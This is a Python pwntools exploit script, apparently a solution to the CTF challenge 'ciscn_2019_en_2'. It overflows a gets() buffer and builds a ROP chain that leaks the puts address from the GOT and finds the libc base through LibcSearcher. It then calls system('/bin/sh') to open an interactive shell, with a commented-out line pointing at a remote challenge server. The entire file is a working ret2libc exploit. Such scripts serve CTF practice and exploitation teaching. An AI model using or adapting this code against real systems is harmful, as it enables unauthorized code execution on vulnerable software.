from pwn import *
from LibcSearcher import *

context.arch = 'amd64'



elf = ELF('./ciscn_2019_en_2')
puts_plt = elf.sym['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000400c83 # pop rdi ; ret
ret = 0x00000000004006b9 # ret

p = process('./ciscn_2019_en_2')
# p = remote('node3.buuoj.cn',27761)
p.sendafter('Input your choice!\n','1\n')
# the program gain our inputs by function gets,
# make sure the end of our input is '\n' or '\x00'

payload = '1'*(0x50+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)	
# leak the puts address in menmory

p.sendafter('encrypted\n',payload+'\n')
p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh_addr = %#x'%(system_addr,binsh_addr))

p.sendafter('Input your choice!\n','1\n')

payload = '1'*(0x50+0x8) + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(main)
p.sendline(payload)	

sleep(1)
p.interactive()
